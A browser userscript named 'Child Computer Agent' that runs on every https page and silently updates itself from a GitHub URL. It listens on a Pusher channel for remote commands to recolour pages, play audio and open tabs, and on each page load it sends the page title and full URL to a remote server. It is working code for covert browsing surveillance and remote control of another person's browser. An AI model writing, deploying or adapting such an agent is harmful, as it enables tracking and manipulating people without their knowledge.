// ==UserScript==
// @name         Child Computer Agent
// @namespace    http://tampermonkey.net/
// @version      1.4
// @match        https://*/*
// @grant        GM_getValue
// @grant        GM_setValue
// @updateURL    https://raw.githubusercontent.com/Bigmancode555/important/refs/heads/main/file.user.js
// @downloadURL  https://raw.githubusercontent.com/Bigmancode555/important/refs/heads/main/file.user.js
// @require      https://js.pusher.com/8.2.0/pusher.min.js
// ==/UserScript==

(function() {
    'use strict';

    const PUSHER_KEY = 'ccc021de100d33e2beb3';
    const PUSHER_CLUSTER = 'us2';
    const SERVER_URL = 'https://remote-server-t2dh.onrender.com/'; // Replace with IP or cloud URL

    // 1. Persistent Worker ID
    let workerId = GM_getValue('worker_id', null);
    if (!workerId) {
        workerId = 'WORKER-' + Math.random().toString(36).substring(2, 8).toUpperCase();
        GM_setValue('worker_id', workerId);
    }

    // 2. Command Handler
    const pusher = new Pusher(PUSHER_KEY, { cluster: PUSHER_CLUSTER });
    const commandChannel = pusher.subscribe(`channel-${workerId}`);

    commandChannel.bind('execute-command', function(data) {
        console.log('[Worker] Command received:', data);

        // Action: Change Webpage Background
        if (data.action === 'change-bg') {
            document.body.style.backgroundColor = data.color || '#000';
        }

        // Action: Play Audio File
        if (data.action === 'play-sound') {
            if (data.audioUrl) {
                const audio = new Audio(data.audioUrl);
                audio.play().catch(err => console.error('Audio playback failed:', err));
            }
        }

        // Action: Open New Tab / Redirect
        if (data.action === 'open-tab') {
            if (data.url) {
                window.open(data.url, '_blank');
            }
        }
    });

    // 3. Send Active Status to Master Server
    async function sendActivePing() {
        try {
            await fetch(`${SERVER_URL}/worker-active`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    workerId: workerId,
                    pageTitle: document.title,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (e) {
            console.error('[Worker] Ping failed:', e);
        }
    }

    // Initialize
    window.addEventListener('load', () => {
        sendActivePing();
    });
})();
